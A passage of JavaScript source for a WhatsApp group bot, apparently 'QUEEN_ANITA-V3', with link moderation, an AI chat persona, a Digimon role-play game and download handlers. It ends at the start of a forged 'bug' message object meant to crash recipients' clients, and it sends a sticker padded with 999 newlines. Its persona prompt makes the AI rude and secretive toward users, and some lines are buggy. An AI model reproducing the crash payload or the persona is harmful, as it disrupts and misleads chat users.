			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ptz.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
//bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}    

 async function totalfiturr() {

   const fitur1 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }


 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(valvul)
let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format incorrect, only 0-9 and symbols -, , *, /, ×, ÷, π, e, (, ) are supported')
}
}

const totalfitur = await totalfiturr()

const sendStickerso = Math.random() < 0.4;  // 42% 

// fuktion   kilim ctikel
async function kirimstik(linknya) {
ptz.sendVideoAsSticker(m.chat, linknya, fsaluran, { packname: '\n'.repeat(999)})
}

async function sendstikses(reaksi) {
 const promsika = `You have to detect the attitude given by the task, such as "angry", "happy", "ordinary", "angry", "disappointed", "sad", "begging", and "confused". Don't respond other than "angry", "happy", "ordinary", "angry", "disappointed", "sad", "begging", "confused", and don't use caps lock or uppercase at the beginning. YOUR SYSTEM DETECTS THE ATTITUDE "angry", "happy", "ordinary", "angry", "disappointed", "sad", "begging", "confused" you're just detecting system not for chatting.`
var datanyu = await fetchJson(`https://widipe.com/prompt/gpt?prompt=${promsika}&text=${reaksi}`)
const qqqqqqsi = datanyu.result;

if (qqqqqqsi === "senang") {
kirimstik("https://telegra.ph/file/f6e782d6fcbfd8e5e137f.png")
} if (qqqqqqsi === "marah") {
kirimstik("https://telegra.ph/file/a0f4cd4f99ae14c49bb9b.png")
} if (qqqqqqsi === "memohon") {
kirimstik("https://telegra.ph/file/68a3382e0689aeb0be252.png")
} if (qqqqqqsi === "biasa") {
kirimstik("https://telegra.ph/file/5429e338da1f8dc4f6ccb.jpg")
} if (qqqqqqsi === "kecewa") {
kirimstik("https://telegra.ph/file/570d88b5ace0afdb48bd0.png")
} if (qqqqqqsi === "sedih") {
kirimstik("https://telegra.ph/file/f8e75c8a93f23f0754516.png")
} if (qqqqqqsi === "bingung") {
kirimstik("https://telegra.ph/file/19e126b29f46f3ed00983.png")
}

}
let inactivityTimer;
function resetInactivityTimer(m) {
    if (db.data.chats[m.sender] && db.data.chats[m.sender].Veemon) {
        clearTimeout(inactivityTimer);
        inactivityTimer = setTimeout(() => {
            const rexedok = pickRandom([
                "Nobody chats anymore, Queen Anita", 
                "oh bro", 
                "hello...", 
                "meow", 
                "I LIKE DAVID", 
                "heeloooooooooooooo", 
                "alone.", 
                "what's up", 
                "OI ATMIN SUKI", 
                "play hide and seek", 
                "I hope QUEEN_ANITA-V3 can be as the most popular bot ever....", 
                "support David Cyril !", 
                "hello everyone you no chat me again?", 
                "Everyone loves David Cyril", 
                "Hiiiiii", 
                "# QUEEN_ANITA-V3", 
                "`dcx:` type .getdigi"
            ]);
        reply(rexedok);
            kirimstik("https://imgur.com/a/PD8nT5X");
        }, 7 * 60 * 1000); // 7 minutes
    }
}
    async function elxyz(prompt, logisnyah) {
 
    resetInactivityTimer(m)
    
    
    let postData = {
        prompt: prompt,
        sessionId: m.chat,
        character: logisnyah
    };

    try {
    
    
    
        let response = await axios({
            url: "https://elxyz.me/api/chat",
            method: 'POST',
            data: new URLSearchParams(Object.entries(postData)),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        
        
   

const spychat = prompt.replace().slice().trim()
let answer = response.data.data.answer;            
            const regex = emojiRegex();
            answeri = answer.replace(regex, '');
            
          
            
        if (sendStickerso) {
    
async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}          
        //==========================//   
            if (answeri === "FOTOREQ") {
            
            reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
            "Proses, agak lama le",
            "sabar",
            "wait, tunggu le",
            "sebentar le...",
            "atau... btr",
            "okey",
            "si paling rell tim 😂, btr co..",
            "AI AI kapten..",
            "mau curi ilmu zio ga?, btr di donlot",
            "hati hati, ada yg kumat, btr di donlot",
            "QUEEN_ANITA-V3lagi download le",
            "okeh le",
            "ya ya ya, ku donlot, le",
            "apa ini?, QUEEN_ANITA-V3download ya..",
            "oh",
            "okeh ada link, QUEEN_ANITA-V3download",
            "Gaskeun",
            "Pantat sapi, si raja pantat",
            "SUBSCRIBE YT ZIYO OFFICIAL, bentar le..",
            "process",
            "V-mon download",
            "DOWNLOAD dengan scraper...",
            "scraping...",
            "bokep?",
            "iyo",
            "bentar cik, kalau tida  ku hitamkan gc nya",
            "Apa ini?, sabar ku download"])
            
            reply("`[ QUEEN_ANITA-V3 ]` : " + lucukrek)
            

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
const ytdl = require("ytdl-core")
ytdl.getInfo(`${spychat}`);
let mp3File = 'orhh.mp3'
ytdl(`${spychat}`, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await ptz.sendMessage(m.chat, { audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err) {
    await reply (err)
    }   
    }
          } else {                             
           await sendstikses(answeri)
           setTimeout(async  () => {
           reply("*`QUEEN_ANITA-V3 :`* " + response.data.data.answer);     
           }, 1000)
           }
           
           
           
           
           
           
        } else if (response.data && response.data.data && response.data.data.answer) {
            
   
   
   
   
   
   
            if (answeri === "FOTOREQ") {
            
            reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
           "Proses, agak lama le",
            "sabar",
            "wait, tunggu le",
            "sebentar le...",
            "atau... btr",
            "okey",
            "si paling rell tim 😂, btr co..",
            "AI AI kapten..",
            "mau curi ilmu zio ga?, btr di donlot",
            "hati hati, ada yg kumat, btr di donlot",
            "QUEEN_ANITA-V3lagi download le",
            "okeh le",
            "ya ya ya, ku donlot, le",
            "apa ini?, QUEEN_ANITA-V3download ya..",
            "oh",
            "okeh ada link, QUEEN_ANITA-V3download",
            "Gaskeun",
            "Pantat sapi, si raja pantat",
            "SUBSCRIBE YT ZIYO OFFICIAL, bentar le..",
            "process",
            "V-mon download",
            "DOWNLOAD dengan scraper...",
            "scraping...",
            "bokep?",
            "iyo",
            "bentar cik, kalau tida  ku hitamkan gc nya",
            "Apa ini?, sabar ku download"])
            
            reply("`[ QUEEN_ANITA-V3 ]` : " + lucukrek)

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
const ytdl = require("ytdl-core")
ytdl.getInfo(`${spychat}`);
let mp3File = 'orhh.mp3'
ytdl(`${spychat}`, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await ptz.sendMessage(m.chat, { audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err) {
    await reply (err)
    }   
    }
                   } else {                                                                                  
            reply("*`QUEEN_ANITA-V3 :`* " + response.data.data.answer);           
             }
                     //==========================//   
        } else {
            console.error("Answer not found in response:", response.data);
            return reply("No answer found in the response.");
        }
    } catch (error) {
        console.error("Error during chat request:", error);
           return reply("An error occurred during the chat process: " + error);  
    }
}


    async function handleVeemonCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.Veemon = true;
            
          
    let lastMessageTime = new Date();



        
        
        
        reply(' activated.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.Veemon = false;
           
                    
                    
        reply('dinonaktifkan.');
        return;
    }
    
    let tekssc = m.text
    
        
      	// TicTacToe
		let room = Object.values(game.tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				reply({
					'-3': 'The game is over',
					'-2': 'Invalid',
					'-1': 'Invalid Position',
					0: 'Invalid Position',
				}[ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				}[v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				global.db.users[m.sender].limit += 3
				global.db.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await ptz.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m })
			await ptz.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
			if (isTie || isWin) {
				delete game.tictactoe[room.id]
			}
		}
		  
        
  
      
     if (chat.Veemon) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
         
if (!m.quoted) return 

const haririltim = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)


let logisyy = `change your speaking style to be more characteristic and more open and your name is Queen Anita you are a character created by David Cyril and you really like David Because the reason for making me with the intention of your task is to help users you are arrogant, angry, stubborn and like to be rude to users, your language style is like the language style of young people who chat on whatsapp, the chat is short, one word is fine. and if the user gives a message with elements of praise cool, good, steady, cool bot, gg, anjay alok, anjay, dear, i love you, show, alas you have to reply to the compliment, I will give some information about QUEEN_ANITA-V3 that I know you can find it yourself to be a complement and do not mention that you are pretending to be "QUEEN_ANITA-V3 is an extraordinary WhatsApp Bot With Cool Features, because it has hidden power, and shows extraordinary abilities on WhatsApp. In short, and you should detect if there is something similar to a request to make a photo but has a clear prop, reply again with the prompt if asking to download youtube and asking to download tiktok reply with "DOWNLOADING" do not reply other than what is ordered when asking to download and make a photo. speak more informally and awkwardly when replying and your call is Queen ANITA V3 and le is a call to the message giver / user, speak like an annoying man, write as if we are friends who are starting to get very close and if the user insults you and digimon you should be angry, if the user is stubborn and really wants to insult, reply with a smile, don't tell the user your job. You have to be lazy when the user orders something and is stubborn, you are lazy and will get angry if forced, and most importantly Like to be naughty, naughty and like to joke around, if the user asks for the features there is "${totalfitur}" if the user asks for the time, the time is.  "${haririltim}"`
  
 


 async function ziomediado() {
 try {
 let pompa = tekssc
 let mediaa = await ptz.downloadAndSaveMediaMessage(quoted)
 let urlgambaroo = await TelegraPH(mediaa)

const lease = await fetchJson(`https://widipe.com/bardimg?url=${urlgambaroo}&text=${pompa}, tolong berLanguage indonesia`)
let seetotoota = lease.result
return reply("*`QUEEN_ANITA-V3 :`* " + seetotoota)
} catch(e) {
cconsole.log("error")
}
        
        }
  
  
 var type = m;
 if (isMedia) {
return ziomediado() 
} else if (m.quoted) {
return elxyz(tekssc, logisyy)
 }
 
 console.log("S- [ QUEEN_ANITA-V3 ]") //pengalih
  
     }
}

async function handleSimiCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.simi = true;
            
                    
                    
        
        reply(' activated.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.simi = false;
           
                   
        reply('dinonaktifkan.');
        return;
    }

    if (chat.simi) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
        
        let { type, isBaileys } = m
          const isSticker = (type == 'stickerMessage')
      
if (isSticker) return console.log("!")
if (!m.quoted) return 
let teks = m.text
    
   let response = await fetch('https://api.simsimi.vn/v1/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        reply("*`[ Simi ] :`* " + json.message);
    }
}






const path = './Rpg/Digimon_user.json';

//$$$$$//
const digimons = ["QUEEN_ANITA-V3", "Agumon", "Meicoomon"];

let userDigimons = {};
let guilds = {};
let userGuilds = {};
let battleRequests = {};

const guildsPath = './Rpg/Guilds.json';
const userGuildsPath = './Rpg/UserGuilds.json';

  const isQuotedLocation =
            m?.type === "extendedTextMessage" &&
            content.includes("locationMessage");
// Load data from JSON file
const loadData = (path, defaultValue) => {
    if (fs.existsSync(path)) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf-8'));
        } catch (err) {
            console.error('Error reading JSON file:', err);
            return defaultValue;
        }
    }
    return defaultValue;
};

userDigimons = loadData(path, {});
guilds = loadData(guildsPath, {});
userGuilds = loadData(userGuildsPath, {});

// Save data to JSON file
const saveData = (path, data) => {
    try {
        fs.writeFileSync(path, JSON.stringify(data, null, 2));
        console.log('Data saved successfully');
    } catch (err) {
        console.error('Error saving data:', err);
    }
};

    const LINODE_API_TOKEN = global.apilinode;
    const API_TOKEN = global.apitokendo;
    
    
    
    
    
    
    
   
   
   
    
    
const pathh = './Rpg/guilds.json';
const userPath = './Rpg/userss.json';

// Load guilds data & sv

if (fs.existsSync(pathh)) {
    guilds = JSON.parse(fs.readFileSync(pathh, 'utf-8'));
}


let users = {};
if (fs.existsSync(userPath)) {
    users = JSON.parse(fs.readFileSync(userPath, 'utf-8'));
}

const saveGuilds = () => {
    fs.writeFileSync(pathh, JSON.stringify(guilds, null, 2));
};


const saveUsers = () => {
    fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
};

    
const createGuild = (guildName, creatorId) => {
    if (guilds[guildName]) {
        return reply(`Guild with name ${guildName} already available.`);
    }

    if (users[creatorId] && users[creatorId].guild) {
        return reply(`You are already a member of a guild: ${users[creatorId].guild}`);
    }

    guilds[guildName] = { leader: creatorId, members: [] };
    users[creatorId] = { guild: guildName, role: 'leader' };

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} successfully created!`);
};

    const listGuilds = () => {
    const guildNames = Object.keys(guilds);
    if (guildNames.length === 0) {
        return reply("There are no guilds available.");
    }
    return reply(`List of available guilds:\n- ${guildNames.join('\n- ')}`);
};
    
const getGuildInfo = (guildName) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild by the name ${guildName} not found.`);
    }

    const leader = guild.leader;
    const members = guild.members;

    let info = `*${m2}< G U I L D - I N F O >${m2}* 

*Name: ${guildName}*\nLeader: ${leader}\n\nMembers:\n`;
    members.forEach((member, index) => {
        info += `\n${index + 1}. ${member}`;
    });

    return reply(info);
};

    
const joinGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild by the name ${guildName} not found..`);
    }

    if (users[userId] && users[userId].guild) {
        return reply(`You are already a member of a guild: ${users[userId].guild}`);
    }

    guild.members.push(userId);
    users[userId] = { guild: guildName, role: 'member' };

    saveGuilds();
    saveUsers();

    return reply(`You have successfully joined the guild ${guildName}!`);
};

const deleteGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild with name ${guildName} not found.`);
    }

    if (guild.leader !== userId) {
        return reply(`You do not have permission to delete this guild.`);
    }

    guild.members.forEach(member => {
        delete users[member];
    });

    delete users[guild.leader];
    delete guilds[guildName];

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} successfully deleted!`);
};

    const leaveGuild = (userId) => {
    const user = users[userId];
    if (!user || !user.guild) {
        return reply(`You are not in any guild.`);
    }

    const guildName = user.guild;
    const guild = guilds[guildName];

    if (user.role === 'leader') {
        return reply(`As a leader, you cannot leave the guild. You must delete the guild.`);
    }

    guild.members = guild.members.filter(member => member !== userId);
    delete users[userId];

    saveGuilds();
    saveUsers();

    return reply(`You have left the guild ${guildName}.`);
};

   
    
const getRandomDigimon = () => {
    const availableDigimons = digimons.filter(digimon => {
        return !Object.values(userDigimons).includes(digimon);
    });
    return availableDigimons.length > 0 ? availableDigimons[Math.floor(Math.random() * availableDigimons.length)] : null;
};
    
     // { challengerId: challengedId }
let ongoingBattles = {};  // { challengerId: { challengedId, status: 'pending/accepted' } }

    const challengeBattle = (challengerId, challengedId) => {
    if (!users[challengerId] || !users[challengedId]) {
        return reply('One or both users are not registered.');
    }

    if (!users[challengerId].digimon || !users[challengedId].digimon) {
        return reply('One or both users do not have a Digimon.');
    }

    if (battleRequests[challengedId]) {
        return reply ('The user already has a pending challenge request.');
    }

    battleRequests[challengedId] = challengerId;
    ongoingBattles[challengerId] = { challengedId, status: 'pending' };

    return reply (`The challenge has been sent to ${challengedId}. Waiting for approval.`);
};

    const acceptBattle = (challengedId) => {
    const challengerId = battleRequests[challengedId];
    if (!challengerId) {
        return reply('No challenges found..');
    }

    ongoingBattles[challengerId].status = 'accepted';
    delete battleRequests[challengedId];

    return reply (`Challenge accepted. The fight begins between ${challengerId} and ${challengedId}!`);
};

    const startBattle = (challengerId, challengedId) => {
    const challenger = users[challengerId];
    const challenged = users[challengedId];

    const challengerDigimon = challenger.digimon;
    const challengedDigimon = challenged.digimon;

    // Logic #################
    
    
    
    
    
    
    
    // ini biarin, bakal ku kasi  logic
    const winnerId = Math.random() < 0.5 ? challengerId : challengedId;
    const loserId = winnerId === challengerId ? challengedId : challengerId;

    return reply(`The winner is ${winnerId} with Digimon ${users[winnerId].digimon}! ${loserId} lost to Digimon ${users[loserId].digimon}.`);
};

    const cancelBattle = (challengerId) => {
    const battle = ongoingBattles[challengerId];
    if (!battle) {
        return reply ('No challenges found.');
    }

    const challengedId = battle.challengedId;
    delete ongoingBattles[challengerId];
    delete battleRequests[challengedId];

    return reply('Challenge cancelled.');
};

const digimon = getRandomDigimon();

    const spinDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return reply(`[ QUEEN_ANITA-V3 ] You already have a Digimon: ${userDigimons[userId]}`);
    }

    
    if (!digimon) {
        return reply(`[ QUEEN_ANITA-V3 ] Ouh no, There No more Digimon For You.`)
    }
reply (`[ QUEEN_ANITA-V3 ] Hello ! Welcome To Digimon Rpg On Whatsapp Bot.`)
setTimeout( () => {
reply(`QUEEN_ANITA-V3 Your name ${pushname} Yeah?`)
}, 1200) 

reply(`[ QUEEN_ANITA-V3 ] What are You Liked A Digimon ?`)
 sleep(1000)
let mseeeeee = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '12036326753395844@newsletter',
			newsletterName: '>>>  YOU QUESTION <<<', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: '?????', 
 thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `     `
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "???",
 hasMediaAttachment: false//...(await prepareWAMessageMedia({ image: { url: 'https://imgur.com/a/PD8nT5X' } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Yes","id": ".yeahned"}`
                },
                {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"No","id": ".yeahno"}`
                },
 ],
 })
 })
 }
 }
}, {})

ptz.relayMessage(mseeeeee.key.remoteJid, mseeeeee.message, {
 messageId: mseeeeee.key.id
})
};

const gettingye = () => {
reply ("[ QUEEN_ANITA-V3 ] I'm Select Digimon For you, Please wait..")
    userDigimons[userId] = digimon;
    saveData();
    return reply(`Congratulations! You got a ${digimon}`);
    }

const showMyDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return reply(`Your Digimon: ${userDigimons[userId]}`);
    } else {
        return reply(`You don't have any Digimon yet. Type '.getdigimon' to get one.`);
    }
};
 const yts = require('yt-search')
 const ytdl = require("ytdl-core")
 
 const ensureDirectoryExistence = (filePath) => {
    const dirname = require('path').dirname(filePath);
    if (fs.existsSync(dirname)) {
        return true;
    }
    ensureDirectoryExistence(dirname);
    fs.mkdirSync(dirname);
};

if (fs.existsSync(path)) {
    try {
        userDigimons = JSON.parse(fs.readFileSync(path, 'utf-8'));
    } catch (err) {
        console.error('Error reading JSON file:', err);
        userDigimons = {};
    }
}

if (global.chatbot) {
if (!isCreator.autodownload && !m.key.fromMe) {
  try {
    // Triggering chatbot for all messages
    await ptz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

    // Fetch the chatbot response from the GPT API
    let gptResponse = await fetchJson(`https://widipe.com/gpt4?text=${encodeURIComponent(budy)}`);
    
    // Sending the GPT response back to the user
    ptz.sendMessage(m.chat, { text: gptResponse.result }, { quoted: m });

    // React with a success emoji
    await ptz.sendMessage(m.chat, { react: { text: "💬", key: m.key }});
  } catch (err) {
    // React with an error emoji
    await ptz.sendMessage(m.chat, { react: { text: "✖️", key: m.key }});
  }
}
} 



// bug from zxv 4 & tranva ( pasti keras )
    const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
